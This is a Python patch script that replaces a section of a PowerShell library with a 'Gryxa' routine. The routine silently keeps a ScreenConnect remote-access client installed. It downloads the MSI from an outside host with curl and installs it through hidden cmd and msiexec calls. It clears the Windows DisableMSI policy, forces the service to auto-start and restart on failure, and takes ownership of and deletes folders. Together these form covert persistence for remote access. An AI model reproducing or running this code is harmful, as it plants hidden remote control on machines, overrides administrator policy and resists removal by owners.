"""Rewrite the Gryxa subsystem in own_lib.ps1 (clean v2, no reinstall loop)."""
from pathlib import Path

LIB = Path("own_lib.ps1")
t = LIB.read_text(encoding="utf-8", errors="replace")

start = t.index("# ── Gryxa MUST-RUN health (L16)")
end = t.index("function Invoke-Exterminate")

new = r'''# ── Gryxa SC v2 (clean rewrite) ───────────────────────────────
# Single-flight ensure. Running => healthy. Stopped svc => start.
# Broken/Stuck => clean-reinstall once, detached. Absent => install once.
# No /fa, no inline blocking /i, no false "already_running".
$script:GryxaDefaultFp = '9908198e668e4750'
$script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$script:GryxaRelayHost = 'update.gryxa.com'
$script:GryxaUiHost = 'ui.gryxa.com'
$script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')

function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }

function Get-GryxaFp {
    $fp = $script:GryxaDefaultFp
    $p = Get-GryxaCfgPath
    if (Test-Path -LiteralPath $p) {
        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -match '^CURRENT_FP=([0-9a-fA-F]{16})\s*$') { $fp = $matches[1].ToLower() }
        }
    }
    return $fp
}

function Set-GryxaFp([string]$Fingerprint) {
    if (-not $Fingerprint) { return }
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    @(
        "CURRENT_FP=$($Fingerprint.ToLower())",
        "RELAY=$($script:GryxaRelayHost)",
        "UI=$($script:GryxaUiHost)",
        "MSIURL=$($script:GryxaMsiUrl)",
        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
    ) | Set-Content -LiteralPath (Get-GryxaCfgPath) -Encoding ASCII -Force
}

function Get-KeepFingerprints {
    $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
    [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427'); [void]$set.Add((Get-GryxaFp))
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -notin $script:SevrzKeep) { [void]$set.Add($fp); Set-GryxaFp $fp }
        }
    }
    return @($set)
}

function Test-TcpHostPort([string]$HostName, [int]$Port = 443, [int]$TimeoutMs = 8000) {
    if (-not $HostName) { return $false }
    $c = $null
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $iar = $c.BeginConnect($HostName, $Port, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { try { $c.Close() } catch {}; return $false }
        $c.EndConnect($iar); return $true
    } catch { return $false } finally { if ($c) { try { $c.Close() } catch {} } }
}

function Get-MsiProperty([string]$MsiPath, [string]$PropertyName) {
    if (-not (Test-Path -LiteralPath $MsiPath)) { return $null }
    try {
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $MsiPath).Path, 0)
        $v = $db.OpenView("SELECT `Value` FROM `Property` WHERE `Property`='$PropertyName'")
        $v.Execute() | Out-Null
        $r = $v.Fetch()
        if (-not $r) { return $null }
        return [string]$r.StringData(1)
    } catch { return $null }
}

function Get-FpFromProductName([string]$ProductName) {
    if ($ProductName -match '\(([0-9a-fA-F]{16})\)') { return $matches[1].ToLower() }
    return $null
}

function Find-ProductGuid([string]$Fingerprint) {
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return $key.PSChildName }
        }
    }
    return $null
}

function Test-ScRunning([string]$Fingerprint) {
    if (-not $Fingerprint) { return $false }
    $svc = Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue
    return [bool]($svc -and $svc.Status -eq 'Running')
}

function Test-ScDir([string]$Fingerprint) {
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        if (Test-Path -LiteralPath (Join-Path $base "ScreenConnect Client ($Fingerprint)")) { return $true }
    }
    return $false
}

function Find-RunningGryxaFp {
    $cfg = Get-GryxaFp
    if (Test-ScRunning $cfg) { return $cfg }
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -in $script:SevrzKeep) { continue }
            return $fp
        }
    }
    return $null
}

function Test-AnyNonSevrzScRunning { return [bool](Find-RunningGryxaFp) }

function Get-GryxaStatus([string]$fp) {
    $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
    $running = [bool]($svc -and $svc.Status -eq 'Running')
    $dir = Test-ScDir $fp
    $guid = Find-ProductGuid $fp
    $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
    $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
    if ($running) { return "HEALTHY|$fp|running=1|relay=$tcpR|ui=$tcpU" }
    if ($svc -and $dir) { return "BROKEN|$fp|svc-present-stopped|relay=$tcpR|ui=$tcpU" }
    if (-not $svc -and ($dir -or $guid)) { return "STUCK|$fp|registered-no-service|relay=$tcpR|ui=$tcpU" }
    return "ABSENT|$fp|not-installed|relay=$tcpR|ui=$tcpU"
}

function Test-GryxaHealth { return (Get-GryxaStatus (Get-GryxaFp)) }

function Clear-GryxaArp([string]$fp) {
    $guid = Find-ProductGuid $fp
    foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                     'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
        if ($guid -and (Test-Path "$r\$guid")) { Remove-Item -LiteralPath "$r\$guid" -Recurse -Force -ErrorAction SilentlyContinue }
        Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -match "ScreenConnect Client \($([regex]::Escape($fp))\)") {
                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Uninstall-ScFingerprint([string]$Fingerprint) {
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $guid = Find-ProductGuid $Fingerprint
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    if ($guid) { Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden; Start-Sleep -Seconds 6 }
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc) { & sc.exe stop $name 2>&1 | Out-Null; & sc.exe delete $name 2>&1 | Out-Null; Start-Sleep -Seconds 2 }
    Clear-GryxaArp $Fingerprint
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        $d = Join-Path $base "ScreenConnect Client ($Fingerprint)"
        if (Test-Path -LiteralPath $d) { & takeown.exe /F $d /R /D Y 2>&1 | Out-Null; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
    }
    return 'removed'
}

function Get-GryxaMsi {
    $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
    if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) { return $msi }
    $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
    try {
        $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
        if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
        & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $script:GryxaMsiUrl 2>&1 | Out-Null
        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) { Copy-Item -LiteralPath $tmp -Destination $msi -Force; return $msi }
    } catch {}
    finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    return $null
}

function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
    $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
    $lines = @(
        '@echo off',
        "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`"",
        "sc config `"ScreenConnect Client ($Fp)`" start= auto",
        "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000",
        "sc start `"ScreenConnect Client ($Fp)`"",
        'exit'
    )
    Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
    Start-Process cmd.exe -ArgumentList "/c `"$cmd`"" -WindowStyle Hidden
}

function Mark-GryxaReinstall {
    Set-Content -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Value (Get-Date).ToUniversalTime().ToString('o') -Encoding ASCII -Force
}

function Invoke-GryxaEnsure {
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    $log = Join-Path $WorkDir 'gryxa_ensure.log'
    function GLog([string]$m) { Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }

    $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
    if ((Test-Path $installCmd) -and (((Get-Date) - (Get-Item $installCmd).LastWriteTime).TotalMinutes -lt 15)) {
        GLog 'inflight_install'
        return "HEALTHY|$(Get-GryxaFp)|inflight=1"
    }

    $fp = Get-GryxaFp
    $runningFp = Find-RunningGryxaFp
    if ($runningFp) {
        Set-GryxaFp $runningFp
        GLog "healthy_running fp=$runningFp"
        return "HEALTHY|$runningFp|running=1"
    }

    $st = Get-GryxaStatus $fp
    GLog "status=$st force=$Force"
    $kind = $st.Split('|')[0]

    switch ($kind) {
        'HEALTHY' { return $st }
        'BROKEN' {
            $name = "ScreenConnect Client ($fp)"
            & sc.exe config $name start= auto 2>&1 | Out-Null
            & sc.exe failure $name reset= 86400 actions= restart/3000/restart/3000/restart/3000 2>&1 | Out-Null
            & sc.exe start $name 2>&1 | Out-Null
            Start-Sleep -Seconds 6
            & sc.exe start $name 2>&1 | Out-Null
            if (Test-ScRunning $fp) { GLog 'started_ok'; return "HEALTHY|$fp|started=1" }
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "broken_clean_reinstall fp=$fp new=$newFp"
            $null = Uninstall-ScFingerprint $fp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
        'STUCK' {
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "stuck_nuke_and_install fp=$fp new=$newFp"
            Clear-GryxaArp $fp
            if ($newFp -ne $fp) { Clear-GryxaArp $newFp }
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
        default {
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { GLog 'fp_parse_fail'; return "UNHEALTHY|$fp|msi-fp-parse-fail" }
            GLog "absent_install fp=$newFp"
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
    }
}

'''

t = t[:start] + new + t[end:]
t = t.replace("OWN_LIB  BUILD 20260802L22", "OWN_LIB  BUILD 20260802L23")
t = t.replace(
    "# L22: stuck Gryxa -> nuke ARP + spawn msiexec /i DETACHED (SC 10s kill can't abort).",
    "# L23: Gryxa v2 clean rewrite (state machine, single-flight detached install).",
)
LIB.write_text(t, encoding="utf-8", newline="\n")
print("replaced:", "20260802L23" in t, "| Repair-SCService kept:", "function Repair-SCService" in t, "| switch action:", "'gryxa-ensure'" in t)
